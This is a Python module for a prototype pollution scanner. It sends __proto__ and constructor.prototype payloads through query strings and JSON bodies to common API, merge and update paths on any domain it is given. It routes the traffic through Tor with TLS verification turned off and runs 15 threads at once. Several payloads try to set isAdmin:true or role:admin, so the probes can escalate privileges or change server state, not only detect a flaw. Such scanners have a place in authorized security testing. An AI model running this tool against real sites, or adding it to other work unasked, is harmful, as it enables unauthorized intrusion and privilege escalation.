"""
Prototype Pollution Scanner
- Client-side prototype pollution via URL params (__proto__, constructor.prototype)
- Server-side prototype pollution in Node.js/Express APIs
- JSON body pollution
- Query string pollution
"""

import re
import json
import logging
from concurrent.futures import ThreadPoolExecutor, as_completed
from modules.utils import tor_session

logger = logging.getLogger(__name__)

# Payloads that pollute Object.prototype if eval'd server-side
PP_PARAMS = [
    '__proto__[sentinel]=polluted',
    '__proto__.sentinel=polluted',
    'constructor[prototype][sentinel]=polluted',
    'constructor.prototype.sentinel=polluted',
    '__proto__[isAdmin]=true',
    '__proto__[role]=admin',
    '__proto__[debug]=true',
    'constructor[prototype][isAdmin]=true',
]

PP_JSON_PAYLOADS = [
    {'__proto__': {'sentinel': 'polluted', 'isAdmin': True}},
    {'constructor': {'prototype': {'sentinel': 'polluted', 'isAdmin': True}}},
    {'__proto__': {'role': 'admin', 'debug': True}},
]

PP_SIGNATURES = [
    (r'"sentinel"\s*:\s*"polluted"',  'CRITICAL', 'Prototype pollution confirmed — sentinel key reflected'),
    (r'"isAdmin"\s*:\s*true',         'CRITICAL', 'Prototype pollution — isAdmin:true reflected'),
    (r'"role"\s*:\s*"admin"',         'CRITICAL', 'Prototype pollution — role:admin reflected'),
    (r'polluted',                      'HIGH',     'Pollution payload reflected in response'),
    (r'__proto__',                     'MEDIUM',   '__proto__ key reflected — possible pollution'),
    (r'prototype',                     'MEDIUM',   'prototype key reflected in response'),
]

API_PATHS = [
    '/api/v1/users', '/api/v1/profile', '/api/v1/settings',
    '/api/v1/data', '/api/v1/config', '/api/v1/search',
    '/api/search', '/search', '/api/data',
    '/', '/index', '/app',
]


class PrototypePollutionScanner:

    TIMEOUT     = (2, 4)
    MAX_WORKERS = 15

    def run(self, domain: str) -> dict:
        result = {
            'domain': domain,
            'findings': [],
            'total': 0,
            'risk_level': 'LOW',
            'error': None,
        }

        session = tor_session()
        session.verify = False
        session.headers.update({
            'User-Agent': 'Mozilla/5.0',
            'Accept': 'application/json',
        })

        base = f"https://{domain}"

        # Build all jobs upfront
        jobs = []  # (method, url, payload_str, json_body)
        for path in API_PATHS:
            url = base + path
            for pp_param in PP_PARAMS:
                jobs.append(('GET', f"{url}?{pp_param}", pp_param, None))
            for payload in PP_JSON_PAYLOADS:
                jobs.append(('POST', url, json.dumps(payload)[:60], payload))
            for merge_path in (path + '/merge', path + '/extend', path + '/update'):
                jobs.append(('MERGE', base + merge_path, '__proto__',
                             {'__proto__': {'isAdmin': True}}))

        seen_findings = set()
        with ThreadPoolExecutor(max_workers=self.MAX_WORKERS) as ex:
            futures = {
                ex.submit(self._probe, session, method, url, payload_str, json_body): url
                for method, url, payload_str, json_body in jobs
            }
            for future in as_completed(futures):
                finding = future.result()
                if finding:
                    key = (finding['url'], finding['evidence'])
                    if key not in seen_findings:
                        seen_findings.add(key)
                        result['findings'].append(finding)

        result['total'] = len(result['findings'])
        if any(f['severity'] == 'CRITICAL' for f in result['findings']):
            result['risk_level'] = 'CRITICAL'
        elif any(f['severity'] == 'HIGH' for f in result['findings']):
            result['risk_level'] = 'HIGH'
        elif result['findings']:
            result['risk_level'] = 'MEDIUM'
        return result

    def _probe(self, session, method: str, url: str,
               payload_str: str, json_body) -> dict:
        try:
            if method == 'GET':
                r = session.get(url, timeout=self.TIMEOUT)
                if r.status_code == 404:
                    return {}
            elif method in ('POST', 'MERGE'):
                r = session.post(url, json=json_body, timeout=self.TIMEOUT)
                if r.status_code in (404, 405):
                    return {}
            else:
                return {}
            return self._check_response(r.text, url, method, payload_str)
        except Exception:
            return {}

    def _check_response(self, text: str, url: str, method: str, payload_str: str) -> dict:
        for pattern, severity, desc in PP_SIGNATURES:
            if re.search(pattern, text, re.IGNORECASE):
                return {
                    'severity': severity,
                    'type': 'Prototype Pollution',
                    'url': url,
                    'method': method,
                    'payload': payload_str[:80],
                    'evidence': desc,
                }
        return {}
